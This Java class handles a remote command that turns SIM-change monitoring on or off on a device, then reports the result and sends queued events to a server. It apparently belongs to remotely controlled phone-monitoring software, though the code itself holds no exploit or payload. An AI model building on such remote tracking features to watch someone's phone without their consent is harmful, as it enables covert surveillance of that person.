package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCSIM extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private int mode = 0;
	
	public PCCSIM(int mode) {
		this.mode = mode;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ENABLE_SIM_CHANGE.getId());
		try {
			Preference pref = Global.getPreference();
			PrefSystem system = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			if (mode == DISABLE) {
				system.setSIMChangeEnabled(false);
			} else {
				system.setSIMChangeEnabled(true);
			}
			pref.commit(system);
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
